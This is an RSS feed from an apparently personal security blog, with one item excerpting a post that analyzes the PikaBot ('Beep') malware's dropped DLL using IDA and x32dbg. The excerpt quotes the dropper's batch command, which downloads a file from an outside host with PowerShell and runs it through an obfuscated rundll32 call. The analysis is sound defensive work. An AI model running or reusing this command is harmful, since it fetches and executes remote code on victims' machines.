<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Beep-Malware on Journal of Connar</title>
    <link>http://localhost:1313/tags/beep-malware/</link>
    <description>Recent content in Beep-Malware on Journal of Connar</description>
    <generator>Hugo -- 0.123.8</generator>
    <language>en-us</language>
    <atom:link href="http://localhost:1313/tags/beep-malware/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Analyzing Beep Malware [PikaBot]</title>
      <link>http://localhost:1313/posts/beepmalware/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/beepmalware/</guid>
      <description>Intro In continuation from my previous post, I will now be analyzing the dropped big.dll. For this purpose, I employed my friend and mentor r4sti to help me out in the analysis of this malicious dll.
Analyzing big.dll - Combining IDA and x32dbg Recall that in our previous post, when the dll was being dropped, a specific exported function was run:
@echo off powershell Invoke-WebRequest -URI https://aradcapital.com/MpD8Yk/00.gif -OutFile C:\programdata\big.jpg call ru%1l32 C:\programdata\big.</description>
    </item>
  </channel>
</rss>
